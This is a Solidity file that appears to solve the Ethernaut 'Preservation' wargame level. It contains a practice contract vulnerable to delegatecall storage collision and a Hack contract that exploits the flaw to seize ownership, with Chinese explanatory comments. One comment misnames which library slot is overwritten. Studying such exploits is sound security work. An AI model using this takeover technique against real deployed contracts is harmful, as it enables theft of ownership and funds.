// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 1、类型（获得 ownership）
 *
 *
 */

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // function attack(address _target) {
    //     Preservation target = Preservation(_target);
    function attack(Preservation target) external {
        // 以太坊地址通常是20个字节（160位）长,大多数整数操作都是基于uint256类型进行的。
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "hack failed");
    }

    function setTime(uint _owner) external {
        owner = address(uint160(_owner));
    }
}

contract Preservation {
    // public library contracts
    // Preservation 主合约使用了库合约 LibraryContract 来设置时间。
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    // setTime（）函数的签名：keccak256哈希函数对函数进行哈希，然后取前四个字节；
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        // 主合约中的timeZone1Library和timeZone2Library是存储两个不同时区时间的库合约地址。
        // owner是合约的拥有者地址
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    // setFirstTime函数用于设置时区1的时间，它使用了timeZone1Library的delegatecall函数来调用库合约的setTime函数，并传递了时间戳作为参数。
    // delegatecall函数的第一个参数是要调用的函数的签名，即setTime函数的函数签名。这个签名被编码为一个bytes4类型的值。第二个参数是要传递给setTime函数的参数，即时间戳_timeStamp。
    // abi.encodePacked编码函数，用于将参数打包成紧凑的字节序列。 它将setTimeSignature的前四个字节和_timeStamp的字节表示合并在一起，形成一个长度为36字节的字节序列。
    // using关键字使其可以直接调用库合约中定义的函数，而无需通过库合约的实例来调用。
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    // storedTime变量用于存储时间戳。
    uint storedTime;

    // setTime函数用于设置时间，它将传入的时间赋值给storedTime变量
    function setTime(uint _time) public {
        storedTime = _time;
    }
}
/** 使用delegatecall执行库合约的函数setTime时，setTime的执行环境是在合约 Preservation 中，会影响 Preservation 合约的存储变量。
 * 1) 第一次调用 setFirstTime 函数: 库合约里 storedTime 是第一个变量，Preservation 合约里第一个变量是 timeZone1Library --->
 *      - 在 Preservation 的storage 里执行库合约的 setTime 函数会更新 Preservation 的 第一个变量（库合约的地址）
 *      - 将我们的合约地址作为参数传入，就会将第一个变量设置成为我们合约的地址
 * 2) 第二次调用 setFirstTIme 函数：
 *      - 里面的timeZone2Library 是hack合约，调用的是hack 合约里面的 setTime 函数，hack 合约里的 setTime 函数可以随意设置
 *      - 但是 setTime 函数可以设置的是 Preservation 合约里的 storage 的变量；
 */
